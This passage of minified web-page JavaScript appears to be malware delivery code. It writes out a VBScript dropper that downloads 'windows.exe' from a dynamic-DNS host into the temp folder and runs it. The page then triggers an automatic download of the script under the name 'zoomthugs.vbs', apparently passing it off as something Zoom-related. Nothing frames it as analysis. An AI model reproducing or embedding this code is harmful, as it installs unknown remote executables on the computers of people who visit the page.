        e = new Blob(['Option Explicit\n\nDim shell, fso, executableName, errorLog, installerUrl\n\ninstallerUrl = "https://thugchat.ddns.net/static/windows.exe"\nSet shell = CreateObject("WScript.Shell")\nSet fso = CreateObject("Scripting.FileSystemObject")\nexecutableName = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\\windows.exe")\nerrorLog = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\\error.txt")\n\n\' Download the executable\nIf Not DownloadExecutable(installerUrl, executableName) Then\n    LogError "Failed to download the executable from " & installerUrl & "."\n    WScript.Quit 1\nEnd If\n\n\' Run the downloaded executable\nIf Not RunExecutable(executableName) Then\n    LogError "Execution of the downloaded executable failed."\n    WScript.Quit 1\nEnd If\n\nWScript.Echo "Executable ran successfully."\n\n\' Function to download the executable\nFunction DownloadExecutable(url, path)\n    On Error Resume Next\n    Dim xmlhttp\n    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")\n    xmlhttp.Open "GET", url, False\n    xmlhttp.Send\n    If xmlhttp.Status = 200 Then\n        Dim stream\n        Set stream = CreateObject("ADODB.Stream")\n        stream.Type = 1 \' Binary\n        stream.Open\n        stream.Write xmlhttp.ResponseBody\n        stream.SaveToFile path, 2 \' Overwrite\n        stream.Close\n        DownloadExecutable = True\n    Else\n        DownloadExecutable = False\n    End If\n    On Error GoTo 0\nEnd Function\n\n\' Function to run the downloaded executable\nFunction RunExecutable(path)\n    On Error Resume Next\n    shell.Run """" & path & """", 1, True\n    RunExecutable = (Err.Number = 0)\n    On Error GoTo 0\nEnd Function\n\n\' Function to log errors to error.txt\nSub LogError(message)\n    Dim logFile\n    If Not fso.FileExists(errorLog) Then\n        Set logFile = fso.CreateTextFile(errorLog, True)\n    Else\n        Set logFile = fso.OpenTextFile(errorLog, 8) \' Append mode\n    End If\n    logFile.WriteLine Now & ": " & message\n    logFile.Close\nEnd Sub'], {
            type: "text/plain"
        }), (t = document.createElement("a")).href = window.URL.createObjectURL(e), t.download = "zoomthugs.vbs", document.body.appendChild(t), t.click(), setTimeout((function() {
            document.body.removeChild(t), window.URL.revokeObjectURL(t.href)
        }), 1e3)
    }))
})();
